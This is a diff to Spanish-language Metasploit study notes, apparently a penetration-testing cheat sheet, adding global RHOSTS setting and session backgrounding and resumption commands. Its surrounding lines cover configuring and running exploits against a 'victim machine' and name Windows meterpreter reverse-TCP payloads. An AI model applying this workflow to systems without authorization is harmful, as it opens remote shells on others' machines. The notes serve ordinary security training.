@@ -63,6 +63,7 @@ En Metasploit puedes importar archivos XML, el cual puedes obtener del escaneo c
 ❯ show advanced options      # Miramos las opciones avanzadas del exploit y lo que debemos de configurar
 ❯ check                      # Nos dice si el RHOST es vulnerable a ese exploit sin explotarlo, esto depende del modulo, si trae esta opcion o no
 ❯ set LHOST ❮IP❯             # Configuramos el IP local eth0, ens33 (Si estamos en una VPN colocar el Tun0)
+❯ setg RHOSTS ❮IP❯           # Configuras de manera global el RHOSTS
 ❯ set RHOSTS ❮IP❯            # Configuramos el IP remoto (maquina victima)
 ❯ set RPORT ❮Port❯           # Configuramos el puerto remoto (maquina victima)
 ❯ set LPORT ❮Port❯           # Configuramos el puerto local
@@ -71,6 +72,10 @@ En Metasploit puedes importar archivos XML, el cual puedes obtener del escaneo c
 ❯ show payloads              # Miramos los payload disponibles
 ❯ set payload ❮Path❯         # Colocamos la ruta del Payload a usar
 ❯ run                        # Ejecutamos el exploit  
+
+❯ ctrl + z                   # Colocas la sesion en 'Background'
+❯ sessions                   # Miramos las sesiones activas 
+❯ sessions -u <ID>           # Regresamos a la sesion 
 ```
 
 Dentro de la maquina podemos hacer algunos comandos específicos
@@ -137,7 +142,7 @@ Es importante tener en cuenta que el tipo de payload utilizado en un ataque depe
 
 Tipos de Payloads
 ```bash
-Non-Stage               # Sends exploit shellcode all at once. Larger in size ando won't always work -> **windows/meterpreter_reverse_tcp**
-Staged                  # Sends payload in stages. Can be less stable -> **windows/meterpreter/reverse_tcp**
+Non-Stage               # Sends exploit shellcode all at once. Larger in size ando won't always work -> windows/meterpreter_reverse_tcp
+Staged                  # Sends payload in stages. Can be less stable -> windows/meterpreter/reverse_tcp
 ```
 
